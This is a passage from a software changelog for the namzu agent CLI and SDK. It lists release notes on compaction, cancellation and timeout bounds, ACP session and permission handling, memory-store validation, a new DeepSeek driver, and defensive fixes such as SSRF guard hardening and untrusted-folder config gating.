  The CLI now sends the compaction summary on the next turn and restores the same compacted history through `/resume`. It waits for pending turn writes before atomically replacing the durable conversation projection, refuses to compact an active turn, and pauses input while the snapshot is owned. Expanded file mentions and image attachments also remain in later model requests instead of being rebuilt from their lossy transcript rows. `/clear` continues to clear only the visible transcript.

  The SDK adds optional `SessionStore.replaceMessages` support to its memory and disk stores. The disk implementation keeps the physical message log append-only by writing one replacement record, then projects later reads from it. `isCompactionMessage` is now exported for hosts that restore summary rows in their own views.

- 99127d8: Expose unsupported document inputs through the public `capability_warning` run event before provider settlement. Consumers handling that event must accept the new `documents` capability value.

  Render provider capability warnings in the interactive transcript, and pause already-queued follow-ups after a failed or abnormally stopped human turn until the operator submits a continuation or successfully changes provider/model.

- 63ec53b: Prevent `/fork` and `/compact` from reading stale conversation history after an
  interrupted turn.

  The terminal becomes interactive as soon as an interrupt is requested, while a
  provider iterator may still be unwinding and may not yet have attached its
  partial reply to the durable-write queue. History operations now distinguish
  that settlement interval from UI idleness. `/fork` waits for every write already
  attached to the queue before copying, and pauses new input while it takes the
  snapshot.

- 2d16ca2: Isolate every live agent-client protocol session by identity, working
  directory, cancellation and exact provider history.

  **What breaks in the SDK:** one ACP session now permits only one unsettled
  prompt, and session working directories must be absolute. Hosts that submitted
  overlapping prompts under one id must wait, cancel, or use distinct sessions;
  hosts that passed a relative `cwd` must resolve it first. Session creation and
  loading also share one collision-refusing namespace, so loading or generating
  an already open id no longer replaces its live record.

  Gateways may return the settled conversation beside the stop reason so the next
  prompt receives exact replay state. The CLI drives that seam with one runtime
  session per wire id, activates trusted target config only at the first prompt,
  routes events and permissions to the owning id, and closes late or connection-
  owned sessions on teardown. Cancelling during lazy runtime construction now
  settles the wire prompt immediately while retaining ownership of, and later
  closing, any session candidate that arrives after cancellation.

- 5380e6f: Preserve the kernel's exact model-visible conversation across interactive and persisted streaming turns, including opaque reasoning, citations, and complete tool sequences. Fresh per-run system prompts remain out of durable history, and opaque state no longer has to be reconstructed from rendered assistant text.
- 15f8ee4: Bound provider stream silence, including query-owned advisory calls and
  RouterAgent routing decisions, compaction verifiers and model-graded eval
  judges, to five minutes by default and abort the stalled provider transport,
  with network-classified retry and fallback recovery where those policies
  apply. This changes the previous default, under which a provider iterator could
  remain silent forever. Set `streamIdleTimeoutMs: 0` on the run, agent, manual
  compaction, verifier, or judge config to keep the old unbounded behavior, or set
  a positive millisecond value to choose a different bound.

  Queries whose caller signal is already aborted now settle as cancelled before
  starting provider, provider-metadata, or tool work. A later cancellation also
  settles while an optional context-window resolver remains pending, even when
  that resolver ignores its signal. With no caller cancellation, `timeoutMs`
  bounds the optional metadata lookup, aborts its private transport signal, and
  falls back to the static context-window table instead of blocking the run.

  The OpenRouter context-window lookup now forwards cancellation to its model-list
  transport. Only fulfilled listings are cached, so cancelling one concurrent
  query cannot abort another query's shared metadata request or force that query
  onto the static context-window table.

  `runExperiment({ timeoutMs })` now applies one validated wall-clock deadline to
  both case execution and scoring. Scorers receive its optional cancellation
  signal; a non-cooperative scorer is detached, and `judgeScorer` forwards the
  signal to its bounded provider transport. Values outside the positive platform
  timer range are refused before a case starts; omit the field for the prior
  unbounded case behavior.

  Compaction verification inside a query now carries the run cancellation cause
  to its provider transport without placing a second idle timer around retry and
  fallback. Public `buildVerifiedSummary`, `compactNow`, and `compactRegion`
  calls bound raw provider silence themselves and accept optional `signal` and
  `streamIdleTimeoutMs`; malformed values and pre-cancelled manual work are
  refused before provider work or a no-op result.

  HTTP embedding batches now have a 30-second whole-request default, including
  response-body reads, where the previous default could wait forever. Set
  `requestTimeoutMs: 0` on `HttpEmbeddingProvider` to keep the former unbounded
  behavior. Invalid timeout values and non-positive or fractional `batchSize`
  or `dimensions` values are refused at construction instead of silently
  disabling the bound or entering a non-progressing batch loop. Successful HTTP
  responses must contain exactly one unique, in-range result per input and finite
  vectors of the configured dimension; malformed or incomplete batches are
  refused atomically instead of reaching ingestion with missing embeddings.

  Public RAG operations accept optional cancellation context. The shipped
  `knowledge_search` tool forwards its run-owned signal through
  `KnowledgeBase`, retrieval or ingestion, and the embedding provider. The HTTP
  provider preserves the caller's exact cancellation reason while aborting only
  its private fetch transport. Custom embedding providers receive the signal as
  a cooperative request; callers still own their wait boundary if a custom
  implementation ignores it. Default retrieval and ingestion recheck authority
  after that custom call settles, so a late result cannot start a vector search
  or persist chunks after cancellation. `VectorStore.search` and `upsert` now
  receive the same optional operation context. The default pipelines also race
  those store promises against cancellation, so a non-cooperative custom store
  cannot leave the public query or ingestion call pending forever.

  A2A agent-card discovery now has a 30-second whole fetch-and-body default and
  accepts an optional caller signal and `timeoutMs`; set `timeoutMs: 0` to retain
  the former unbounded behavior. `A2ADelegate.timeoutMs` now starts before
  `message/send` and bounds the whole delegation instead of polling only. A
  pre-cancelled dispatch starts no remote work, pending fetch and body promises
  cannot hold `waitForTask`, and caller cancellation preserves its exact cause on
  the private transport. Poll and delegation timers are validated at
  construction. Once a safe task id exists, cancellation or timeout sends one
  independently bounded `tasks/cancel`; during initial task creation the client
  keeps a short cleanup grace and explicitly reports an unknown remote outcome if
  the peer never returns an addressable id. Poll replies are bound to that initial
  id, and transport or protocol failures after it is known make the same bounded
  cleanup attempt before the original failure is returned. An `input-required`
  task is also bounded-cancelled before the delegate reports that it cannot
  supply the requested input.

  Connector execution now carries optional operation authority through the
  manager, every connector-tool adapter, real query runs, tenant/environment
  facades, health checks, and `MCPConnectorBridge.callTool`. Custom connectors
  receive the signal; if they ignore it, the manager settles with an honest
  unknown remote outcome and rejects a late success that does not identify a
  received response. A tenant call cancelled before admission no longer spends a
  rate-limit slot.

  `HttpConnector` and `WebhookConnector` now apply one validated 30-second
  fetch-and-body deadline and a streaming 2 MiB response limit by default. Set
  positive `timeoutMs` and `maxResponseBytes` values to choose different bounds.
  Cancellation, deadline, or response-size failure aborts only the private
  transport/body reader and preserves the caller's exact cause. Result metadata
  distinguishes `not_started`, `unknown`, and `response_received`, includes retry
  safety, and keeps a received status visible when its body is unavailable.

  Dynamic HTTP paths and webhook URL overrides must remain on the configured
  origin. Model-authored routing headers are refused, redirects are not followed,
  and 3xx responses are no longer reported as success. Configure a separate
  connector instance for each authorized origin; callers that previously used a
  cross-origin webhook override must migrate to that instance.

  `GuardedFetchProvider` now applies one validated 30-second deadline across DNS
  resolution, every manually admitted redirect fetch, and the final response
  body, while preserving a caller's exact cancellation cause on a private
  transport signal. Its 2 MiB default response cap is enforced from streamed
  bytes rather than after `response.text()` allocates the whole body; overflow
  cancels the reader and returns a valid UTF-8 prefix. Redirect bodies are
  cancelled when abandoned, and a spent redirect budget causes no DNS lookup for
  the next target. Set positive `timeoutMs` and `maxBytes` values or a
  non-negative integer `maxRedirects` to choose other bounds. Custom
  `GuardedFetchConfig.resolve` functions may now accept the operation signal as
  a second argument. IPv4-mapped IPv6 literals are canonicalized back to their
  IPv4 address before range checks, closing the hexadecimal mapped loopback and
  link-local bypass; the full IPv6 link-local and multicast ranges are also
  refused.

  MCP request methods now accept optional cancellation authority, and generated
  MCP tool and prompt adapters forward the run-owned tool signal. A pre-aborted
  request starts no transport work; a pending request preserves the caller's
  exact cause, aborts a private transport, removes its correlated pending id, and
  makes a one-second best-effort `notifications/cancelled` attempt. The
  notification does not prove that an already-started remote side effect stopped.
  Paged list calls recheck the same signal before each page.

  `MCPClient.requestTimeoutMs` and HTTP MCP transport `timeoutMs` values must now
  be positive platform-range integers. A shorter transport deadline remains a
  request-timeout terminal and emits the same correlated cancellation. HTTP
  fetches and response-body reads share operation authority; disconnect owns
  active requests and cancellation cleanup. Reconnects fence late POST responses
  and SSE batches from prior generations, clear Streamable session state, and
  accept session ids only from successful `initialize` responses. Per-send
  failure no longer marks a Streamable client connection-wide errored or rejects
  unrelated concurrent calls. `MCPTransport.send` now accepts optional
  `MCPTransportSendOptions`; custom transports should refuse pre-aborted work and
  stop their per-send I/O when its signal fires.

  Provider model listings and credential probes now accept optional cancellation
  signals. Retry, fallback, stream-idle and instrumentation decorators preserve
  that authority, and every bundled CLI driver forwards it to the underlying
  transport where supported or refuses a result that arrived after cancellation.
  Existing zero-argument provider implementations remain valid.

  The interactive provider picker now cancels model discovery, credential checks
  and subscription sign-in when the operator backs out, supersedes the work, or
  leaves the screen. Late results cannot reopen an old model step, accept a
  credential, re-probe the application, or persist a subscription credential
  after cancellation. Model listing and credential probing both settle after a
  three-second bound even when a custom provider ignores its signal.

  Between-turn and durable-resume subscription refreshes now settle on caller
  cancellation and apply one 30-second bound across the token request and response
  body. Refreshes in one session are serialized and re-read their source at the
  head of the queue, preventing a later stale caller from downgrading a token
  published by an earlier one. Namzu's credential file uses an exact conditional
  replacement under a cross-process, atomically published lock; an external
  rotation or logout wins, and an uncertain publication refuses instead of using
  an uncommitted refresh. Borrowed macOS Keychain credentials are read-only: a
  changed or removed entry wins, and a successful refresh of an unchanged entry
  remains session-local.

- dd40b56: Preserve pasted images when a prompt is submitted while another turn is running.

  All model-bound prompts now enter one FIFO queue, and the queue carries the
  complete text-and-image submission into both the provider request and durable
  conversation. This also prevents a new idle-edge submission from bypassing an
  older queued prompt while the queue-drain effect is being scheduled. Switching
  conversations discards pending prompts even when the old turn settled behind
  the picker before the queue pump could start them.

- 741c18c: Refuse to resume, continue, fork, or mutate conversations that are already archived, closed, or outside the current workspace. Exact `--resume <id>` now resolves the durable id independently of the recent-conversation limit, while archived history remains readable for inspection and export.
- 63e8148: Refuse an unreadable or structurally invalid persistent-memory index instead
  of treating it as an empty store.

  `DiskMemoryStore` now validates every persisted index entry before publishing
  it into the live projection. Invalid JSON, newer schema data, unrecognized or
  duplicate memory IDs, wrong field types, unknown statuses and invalid
  timestamps leave the original index byte-identical and make the operation
  fail. Once the durable file is repaired, the same store instance may retry.

  The CLI's memory tools inherit the fail-closed boundary, so `save_memory`
  cannot overwrite an index the current SDK could not safely understand.

- a1fe55e: Refuse a permanently unusable subscription refresh grant before provider work instead of repeatedly retrying it and sending the expired access token. The live session caches the refusal only for the exact credential, adopts a later login or external rotation, and treats deletion from the authoritative store as logout rather than continuing with an in-memory token.
- 487ed4e: Repair provider-invalid tool history chronologically before the first model
  call. Abandoned calls receive an explicit unknown-outcome error result while
  checkpoint calls still owned by approval or crash recovery retain their exact
  assistant state and execute only through that authority path. The SDK adds the
  public `repairToolMessageHistory` projection and `message_history_repaired`
  `RunEvent`; CLI transcripts surface the measured repair without exposing tool
  content.
- c933952: Return exact verifier token usage from `compactNow` and `compactRegion`. Every non-null `CompactionResult` now includes `usage`; an all-zero record means the pass made no verifier request. Hosts that account for provider work should include this record in their own ledger.

  After `/compact`, remove the old context-fill gauge only after the replacement conversation has been durably published. A pending or failed replacement keeps the old transcript and measurement; a successful replacement remains unmeasured until the next model request reports the new context size.

- fd280c0: Make the first structured-memory search after process startup see records that
  were already persisted on disk.

  `buildMemoryTools(store)` is a new store-authoritative composition whose
  `search_memory` tool awaits the store's asynchronous `list()` boundary. This is
  the default for lazy and disk-backed stores. The existing
  `buildMemoryTools(store, index)` form remains index-authoritative and performs
  no store read, preserving custom pre-populated or independently managed search
  indexes.

  The CLI now uses the store-authoritative form for both its main and delegated
  agent registries, so a fresh session can recall prior run memories without an
  unrelated read or write first warming the in-memory index.

- ee4fd1d: Persist provider-native reasoning state with the exact provider, model, and fallback-chain member that produced it. Same-route sessions now replay native reasoning after restart, `/resume`, and `/fork`; a model, provider, or member switch keeps portable assistant/tool history without sending foreign native reasoning metadata.

  `@namzu/sdk` adds `ProviderRoute`, `AssistantMessageSource`, optional assistant source/replay fields, and the provider request/stream/response plumbing. Fallback and forced-final turns now attribute provenance and cost to the member that actually answered.

  `@namzu/cli` preserves and validates the additive assistant source shape in stateless and durable history.

  **What breaks in the drivers:** hand-built assistant reasoning and histories written by earlier versions do not carry a validated route-bound replay envelope, so they are no longer emitted as native `reasoning_content` or signed thinking. Their portable assistant text and tool exchanges remain available, but an upstream that requires native metadata for an old tool continuation may refuse that request; compact or start a fresh conversation before continuing such legacy history. Preserve the complete assistant message returned by new runs, including `source.replayState`. Direct callers of the exported DeepSeek `toDeepSeekMessages` converter must also pass the target `ProviderRoute` as its second argument.

- 5a5f48e: Render agent-authored conversation, permission and live-tool text through a
  terminal-safe display projection. Source controls and directional formatting
  remain exact in model history, persistence, exports and clipboard copies, but
  appear as visible escapes instead of executing or reordering terminal output.
- c8753a7: Propagate run cancellation through every plugin hook and preserve cancellation
  when it occurs before the iteration loop. Hook code now receives a signal that
  combines the run lifetime with its hook deadline, and a hook that ignores that
  signal can no longer keep the run waiting.

  Make CLI session shutdown cancel and settle in-flight sends, manual compaction,
  and durable resumes before external tool servers are closed. Calls made after
  session close now refuse before starting provider work.

- 9b9a1e3: Keep untrusted project authority out of CLI startup.

  Interactive and headless launches now resolve only user, environment and
  managed configuration before the folder trust decision. Project config,
  project commands and project instructions activate together after trust, using
  the actual `--cwd` target for headless runs. Invalid project config can no
  longer outrun an untrusted-folder refusal, and the canonical approved directory
  is pinned so a later symlink swap cannot redirect the launch. Headless sessions
  also now receive their configured sandbox policy instead of silently dropping
  it.

- Updated dependencies [bebad69]
- Updated dependencies [f3bf47b]
- Updated dependencies [27667cc]
- Updated dependencies [fd5fcea]
- Updated dependencies [777b444]
- Updated dependencies [780a471]
- Updated dependencies [74705e2]
- Updated dependencies [0e678a8]
- Updated dependencies [753b037]
- Updated dependencies [45e8f56]
- Updated dependencies [3c61c94]
- Updated dependencies [f528acd]
- Updated dependencies [0a7bd58]
- Updated dependencies [924df56]
- Updated dependencies [ce8cd61]
- Updated dependencies [94d3306]
- Updated dependencies [45d7014]
- Updated dependencies [99127d8]
- Updated dependencies [2d16ca2]
- Updated dependencies [a3a632f]
- Updated dependencies [7a45aa4]
- Updated dependencies [79faa99]
- Updated dependencies [99ff79e]
- Updated dependencies [ade6c85]
- Updated dependencies [5581dde]
- Updated dependencies [8de3582]
- Updated dependencies [fd6683b]
- Updated dependencies [15f8ee4]
- Updated dependencies [43620d9]
- Updated dependencies [63e8148]
- Updated dependencies [317360a]
- Updated dependencies [487ed4e]
- Updated dependencies [c933952]
- Updated dependencies [fd280c0]
- Updated dependencies [ee4fd1d]
- Updated dependencies [192d90e]
- Updated dependencies [143b8d9]
- Updated dependencies [c8753a7]
- Updated dependencies [1792bcb]
- Updated dependencies [bb8cb05]
- Updated dependencies [095c936]
- Updated dependencies [c6ebb31]
- Updated dependencies [bf26200]
  - @namzu/sdk@31.0.0
  - @namzu/openai@1.4.0
  - @namzu/deepseek@1.0.0
  - @namzu/anthropic@4.0.0
  - @namzu/ollama@2.2.1
  - @namzu/openrouter@2.3.1

## 12.1.0

### Minor Changes

- 7050dd4: Add `@namzu/deepseek`, and stop dropping reasoning when a stream is collected.

  **A new driver, and a separate package on purpose.** DeepSeek's endpoint is OpenAI's Chat Completions shape, so pointing `@namzu/openai` at it with a `baseURL` looks like it should work. It does not, and the reason is thinking mode: it is **on by default**, the chain of thought comes back in a `reasoning_content` field that wire has no concept of, and the vendor requires that field replayed on every later turn once tool calls are in play. A driver that does not know about it drops the model's reasoning on every call.

  `@namzu/deepseek` maps `ThinkingConfig` one-to-one onto the vendor's own `adaptive | enabled | disabled`, streams reasoning through `delta.reasoning` — the same channel `@namzu/anthropic` uses, so a host that renders one renders the other — and replays it automatically. Callers pass the assistant message back and the field goes with it.

  It **refuses** two things the vendor accepts and applies to nothing: `effort` (this wire validates `thinking.type` and ignores any effort beside it) and the sampling parameters while thinking is on. Both were measured against the live API rather than read off the documentation. `samplingInThinkingMode: 'ignore'` opts out of the second.

  It carries no price rows, deliberately: the vendor charges twice as much during peak UTC hours, and a static table has no hour in it.

  **`collectChatCompletion` dropped reasoning blocks** (`@namzu/sdk`). `delta.reasoning` existed, `AssistantMessage.reasoning` is documented as replayed verbatim, and the run loop assembled it correctly — but this helper, which every non-streaming caller goes through, threw it away. So the same stream produced a message with reasoning through one route and without it through the other, and a vendor that needs the blocks back was sent a message that had lost them. It now buckets them by index exactly as the run loop does. This affects `@namzu/anthropic` users too.

  **The CLI ships the driver** (`@namzu/cli`), so `namzu --provider deepseek` works on a fresh install with `DEEPSEEK_API_KEY` set. That is a fifth bundled driver and a slightly larger install.

  Models are `deepseek-v4-flash` and `deepseek-v4-pro`. `deepseek-chat` and `deepseek-reasoner` were discontinued on 2026-07-24 and resolve to nothing.

### Patch Changes

- Updated dependencies [7050dd4]
  - @namzu/deepseek@0.1.0
  - @namzu/sdk@30.2.0

## 12.0.4

### Patch Changes

- Updated dependencies [03e363c]
  - @namzu/sdk@30.1.0
  - @namzu/files@1.1.0
  - @namzu/anthropic@3.4.0
  - @namzu/ollama@2.2.0
  - @namzu/openai@1.3.0
  - @namzu/openrouter@2.3.0

## 12.0.3

### Patch Changes

- b2c005c: Make each README an npm package page rather than the package's manual.

  `@namzu/sdk`'s README was a twenty-four-section architecture tour, 45 KB of it; the others ran to several hundred lines each. That is the right shape for a single-package repository, where the README _is_ the documentation, and the wrong one here — it duplicated a `docs/` tree that already existed, and nothing checked that the two agreed.

  Each README is now what a reader needs in the first minute: what the package is, install with its Node requirement, one working example, and links. The long-form material moved into `docs/` whole — `docs/sdk/architecture.md`, `docs/cli/reference.md`, `docs/packages/<name>.md` — where the doc gates cover it.

  Two documentation defects fell out of the move, both in `@namzu/telemetry`'s session-export example, and both had been shipping: the config field is `redactors` and takes a list, not `redactor` taking one; and `secretRedactor` is a factory that has to be called. The required `destination` field was missing from the example entirely. They surfaced because a README is gated by nothing and `docs/` is compiled against the built SDK.

  No API change.

- Updated dependencies [b2c005c]
- Updated dependencies [5394981]
  - @namzu/sdk@30.0.1
  - @namzu/files@1.0.1
  - @namzu/anthropic@3.3.2
  - @namzu/ollama@2.1.1
  - @namzu/openai@1.2.2
  - @namzu/openrouter@2.2.1

## 12.0.2

### Patch Changes

- e9a5e61: Remove the process-wide logger. A component given no logger now emits nothing instead of writing to your stderr.

  **Removed from `@namzu/sdk`'s public surface:** `getRootLogger` and `configureLogger`. Both shipped `@deprecated` in an earlier minor, naming `installProcessSink` and `createLogger` as their replacements — this release is the removal that window existed for. `Logger` and `getLogCounters`, the other two exports from that module, are unchanged.

  **What broke and what to do.**

  `getRootLogger()` — build your own and pass it where you construct things:

  ```ts
  import { createLogger, installProcessSink, prettySink } from "@namzu/sdk";

  installProcessSink(prettySink(process.stderr), "info");
  const log = createLogger({
    sink: prettySink(process.stderr),
    level: { current: "info" },
    resource: { "service.name": "my-app" },
    scope: "my-app",
  });

  await query({ ...params, runConfig: { ...runConfig, logger: log } });
  ```

  `configureLogger({ level })` — a level was only ever meaningful against a destination, and the destination is now yours. Pass the level to `installProcessSink(sink, level)`, or to `createLogger`'s `level` box, which stays live: assigning `level.current` retunes a logger already handed out.

  Both take a level of type `LevelFilter` (`'debug' | 'info' | 'warn' | 'error' | 'silent'`), which is exported and unchanged.

  **The behaviour change, which no type will catch.** `logger` was always optional on `RunConfig` and on every tool and component config, and omitting it used to mean "write to the process root" — in practice, your stderr, from a library, on a stream your program may be using for its own protocol. It now means `NOOP_LOGGER`: nothing is emitted, and the discard is counted, so `getLogCounters()` still tells you _N calls were thrown away_ rather than _nothing happened_. If your application relied on SDK diagnostics appearing without asking for them, they will stop appearing, and the compiler will not tell you. The field names are unchanged, so passing a logger is the whole migration.

  Installing a process sink no longer reroutes SDK internals on its own. It sets the destination and owns the counter set; what routes through it is the logger you build over it and hand in.

  **Also exported:** `getProcessSinkCounters()`, so a host that builds its own logger can count into the process's set rather than a private one — which is what keeps `getLogCounters()` and `namzu doctor`'s `logging.pipeline` check reporting real numbers.

- Updated dependencies [e9a5e61]
  - @namzu/sdk@30.0.0
  - @namzu/anthropic@3.3.1
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.1
  - @namzu/openrouter@2.2.0

## 12.0.1

### Patch Changes

- Updated dependencies [e114fd5]
- Updated dependencies [0ef3e40]
- Updated dependencies [e92b530]
  - @namzu/sdk@29.0.0
  - @namzu/anthropic@3.3.1
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.1
  - @namzu/openrouter@2.2.0

## 12.0.0

### Major Changes

- a093e22: Topic ids now begin `top_` instead of `thd_`. From this release `thd_` means only the pre-0.2.0 top-level container that `session/migration/id-prefix.ts` and `session/migration/filesystem.ts` already coerce to `prj_legacy_*` — the Topic layer's own id no longer shares that prefix, closing the ambiguity where two unrelated things wore one prefix and only a path depth told them apart.

  **What breaks, and what to do:**

  - **A minted topic id is now `top_*`.** `generateTopicId()` returns `top_…`; the `TopicId` type is `` `top_${string}` ``. Code that pattern-matches `thd_` on a live topic id, or that pins a literal, needs updating. Code that pattern-matches `thd_` on the _legacy container_ is unaffected and should stay.
  - **`acceptLegacyThreadId` → `acceptLegacyContainerId`** and **`rejectLegacyPrefix` → `rejectLegacyContainerPrefix`.** Behaviour is identical (`acceptLegacyContainerId` also takes a new optional third `windowOpen` argument, defaulting to the existing `WINDOW_OPEN`). The old names remain as `@deprecated` aliases — your code still compiles and warns. Renamed because "Thread" stopped describing what these accept: the pre-0.2.0 container, not the Topic layer.

  **Nothing is removed in this release.** `ThreadId`, `ThreadManager`, `InMemoryThreadStore`, `generateThreadId`, `acceptLegacyThreadId` and `rejectLegacyPrefix` are all still exported and all now carry `@deprecated`. Removal is a later major.

  That is deliberate, and it corrects a mistake this change was originally planned to make. The rename of Thread→Topic marked those names deprecated in source, but that work has never been published: the registry is still on 27.1.0, and its changeset is still unconsumed. So on every version a consumer can actually install, `ThreadManager` is not a deprecated alias — it is the _only_ name, and ordinary code uses it. Deleting it here would have moved a consumer from "works, no warning" straight to "gone", which is a rename with no alias wearing a major's clothes. This release is the first one that can carry the warning; the next major may remove them.

  Note that `ThreadId` now resolves to `` `top_${string}` `` rather than `` `thd_${string}` ``, and `generateThreadId` mints `top_`. An alias that kept the old prefix would hand two different id spaces to one program depending on which name a file happened to import.

  **Existing records migrate on first read; no operator action.** A `session.json` written with `topicId: "thd_x"` is rewritten to `topicId: "top_x"` when `DiskSessionStore` reads it, and durably on the next write-back, via a new `session-store` schema step (2→3) chained after the existing `threadId`→`topicId` field-rename step for any record still at v1. A serialized `RunState` snapshot migrates the same way through `parseRunState` (`RUN_STATE_VERSION` 2→3).

  **No topic-directory rewriter is included, and none is owed.** There is no disk-backed `TopicStore` — `store/topic/memory.ts` is the only implementation — so no `.namzu/…/threads/<thd_x>/` directory has ever been written by a shipped build. The only on-disk artifact naming a topic is the denormalized `topicId` field covered above.

- 9bce045: The denormalized `threadId` field is renamed to `topicId` everywhere it appears
  on an exported shape, and `SessionStore.listSessions` is renamed to
  `listSessionsByTopic`. NZ-TOPIC-01 (a previous minor) renamed the _layer_ to
  Topic and left this field as the one place the retired word still surfaced on
  every shape a consumer types against; this is that rename landing.

  Mechanical edits for every consumer:

  - `session.threadId` → `session.topicId` (same rename on `RunState`,
    `AgentTaskContext`, `BaseAgentConfig`, `CreateSessionParams`,
    `HandoffAssignment`, `RunPersistenceConfig`, `RunContextConfig`/`RunContext`,
    `QueryParams`, `RunStateScope`, `AgentIdentity`, and the CLI's
    `CliSessions`/`RunScope`)
  - `store.createSession({ threadId, ... })` → `store.createSession({ topicId, ... })`
  - `store.listSessions(id, tenantId)` → `store.listSessionsByTopic(id, tenantId)`

  Not touched: the `thd_` id prefix, `ThreadId`/`generateThreadId`/
  `ThreadManager`/`InMemoryThreadStore` (still `@deprecated` aliases from
  NZ-TOPIC-01), and the `Thread*`-named error classes in `session/errors.ts`
  (`ThreadClosedError`, `ThreadNotEmptyError`, `StaleThreadError`) — their
  `details.threadId` field keeps its name too. Renaming those is a separate,
  later change with its own deprecation window; this one is the FK field only.

  No alias ships alongside `topicId` — `SessionStore` is an interface hosts
  implement, and a required method or field cannot be added behind a deprecated
  twin without every implementor already supplying it. NZ-TOPIC-01 already
  carried one minor of warning for the vocabulary; this is the field itself
  moving, and it has to move all at once.

  **Records already on disk migrate on first read, no operator action.**
  `session.json` bumps the shared `session-store` schema from v1 to v2; a
  record written by any older release loads exactly as it did before and comes
  back with `topicId` set from its `threadId`, both in-memory immediately and
  (after the next write to that record) on disk. `project.json`,
  `subsession.json`, `summary.json`, and `messages.jsonl` lines never carried
  the field and the migration step leaves them untouched — verified directly,
  not just by inspection: a naive unconditional version of this migration would
  stamp a stray `topicId: undefined` onto every one of them, and that is
  exactly what the new migration unit test rejects.

  A `RunState` snapshot a host serialized under `RUN_STATE_VERSION: 1` is
  coerced the same way by `parseRunState`. A snapshot written under the new
  `RUN_STATE_VERSION: 2` and read by an SDK still on version 1 is refused with
  `RunStateVersionError`, not partially restored — unchanged behavior, now
  exercised against this specific case.

### Minor Changes

- 5136fbd: The agent-client bridge can now ask a human, read the editor's unsaved buffers, and resume a session. NZ-PEER-07 refused any session whose client could not answer a permission request, which was honest and left the bridge unusable for the case it exists for.

  **The direction the bridge did not have.** A notification is fire-and-forget; a permission prompt is a question the run cannot proceed past. The server now issues JSON-RPC _requests_ — `session/request_permission`, `fs/read_text_file`, `fs/write_text_file` — parks the promise by id, and resolves it when the client's response frame arrives. A response frame used to be ignored, which was right when nothing was ever out on the wire and would now leave a run parked with nobody coming.

  **Three ways the permission exchange fails silently, each closed and each mutation-checked:**

  - Auto-approving instead of asking. `toResumeDecision` maps the outcome to the kernel's own `HITLResumeDecision`, and a denial becomes `reject_tools` with the client's feedback — a `continue` there would run the calls the human just refused. A bare denial gets a default sentence, because an empty `reject_tools` feedback reads to the model as a tool that failed for no reason and it retries.
  - An "approve all" that never takes. `approve_tools` with nothing remembered is indistinguishable from a plain approve, so `approve_all` carries the grant keys and a plain approve carries none — consent is not transferable.
  - An "approve all" that leaks. The latch lives on the SESSION record: a second session from the same process asks again. Hoisting it to the server, or to a module-level variable, would make one person's "stop asking me" cover the next session this process serves — possibly a different repository, editor window, or human.

  An answer the agent cannot parse is treated as a refusal, never as consent.

  **`clientBackedSandbox` makes the editor's buffers the filesystem.** A user with unsaved changes had the agent read disk, see a version nobody is looking at, and patch _that_. A client declaring the `fs` capability answers reads and writes instead. It is a decorator over the existing `Sandbox` — a client-backed object implementing only the file methods would take `bash` away from a session that had it — and it is a `Proxy` rather than a spread, so a member added to `Sandbox` later still reaches the real one. A failed client read rejects rather than falling back to disk: stale text is the exact thing the capability exists to stop.

  **`session/load` resumes.** The prior turns come from the gateway's session store, never from the bridge, and the resumed session answers with the SAME id — a client that asked to resume `ses_x` and got `ses_y` back has to rewrite everything keyed by the old one. A gateway with no store refuses rather than returning an empty history, which a client cannot tell apart from a session that really had no turns. Resuming carries the same permission requirement as creating, because a refusal on `session/new` that `session/load` walks around is not a refusal.

- 70f8d75: An agent-client protocol bridge over stdio, and `namzu acp` to drive it. An editor extension or a CI orchestrator could previously do two things: shell out to the CLI and scrape stdout, or embed this SDK in its own process. This is the third.

  **The command ships in the same change as the bridge, and that is the point.** `MCPServer` and `ServerStdioTransport` are both exported from this package, and nothing in the tree has ever constructed an `MCPServer` — a complete protocol server with no driver, which reads as a supported feature and is not one. A subprocess test spawns the real binary and completes a handshake over a real pipe, so removing the registration fails a test rather than quietly repeating that shape.

  New: `ACPServer`, `toAcpSessionUpdate`, `toAcpStopReason`, the `Acp*` wire types, and `ACP_METHODS` / `ACP_PROTOCOL_VERSION` / `ACP_ERROR_CODES` / `ACP_PERMISSION_CAPABILITY`. Scope is the session core — initialize and capability exchange, session creation, prompting with streamed updates, and cancellation. No new dependency: it runs on the `ServerStdioTransport` this package already had.

  **The method set cannot drift from the pinned version.** `ACP_METHODS` and the server's handler map are authored independently and compared in both directions by a test: a handler nobody advertises fails, and an advertised method with no handler fails. Deriving one from the other would have made that test a tautology.

  **A session is REFUSED when the client declared no permission capability**, naming the capability. Approval routing lands separately; until it does, a session that cannot ask a human anything and runs every tool regardless is not a degraded version of asking — it is the opposite of it, arrived at by omission.

  **Tool calls are rendered by the tool, never by the bridge.** Updates carry a `ToolCallView` from `createToolPresenter`, and a test asserts no module here contains a tool-name comparison — a front end that switched on `'edit'` could never give a diff to a tool it had not heard of. The client-visible command list is `HostCommandRegistry.describe()` verbatim, asserted by registering a command the bridge has never heard of and expecting it to appear.

  An unknown method answers `-32601` and the connection stays open; a malformed frame is survived. Both are asserted against the spawned binary, as is the one that matters most for stdio: **nothing but protocol reaches stdout**, with info-level logging on.

  `namzu acp` builds its session lazily, at the first prompt. `initialize` and `session/new` are how a client discovers what this agent is and what it requires, and neither needs a model — building the session up front made a namzu with no configured credential answer a connection attempt by exiting, so an editor saw a pipe that closed with the reason on a stderr nobody was reading.

- dbd9d3b: `@namzu/telemetry` gains a session export seam: a run's own events, through an ordered redaction chain, to a sink you supply — with one sentence a host can show a user before any of it leaves the machine.

  Spans and metrics describe the agent's execution. They are deliberately not a mirror of the conversation, so an operator who wanted to hand a session to support had no seam at all: they would instrument the store by hand, with no redaction extension point and nothing to disclose.

  New exports: `createSessionExportListener`, `describeSessionExport`, `secretRedactor`, `CONTENT_BEARING_EVENT_TYPES`, and the `SessionExportSink` / `SessionExportRedactor` / `SessionExportRecord` / `SessionExportConfig` / `SessionExportListener` types. The listener is assignable to the SDK's `RunEventListener`, so it attaches to `query({ onEvent })` with no new hook. The record wraps `RunEvent` verbatim rather than flattening it into an export-shaped copy — a second definition of every event in the kernel is one that can drift, and the drifted one would be what an operator reads during an incident.

  **A redactor may refuse, and a refusal never falls open.** Returning `null` drops the record and stops the chain; a redactor that THROWS also drops it, and the un-redacted record is never emitted as a fallback. The exception does not escape into the run either. `emit` is fire-and-forget, so a slow destination cannot stall a turn, and a throwing sink is counted apart from a refusing redactor — "the redactor refused" and "the collector is down" send an operator to different places.

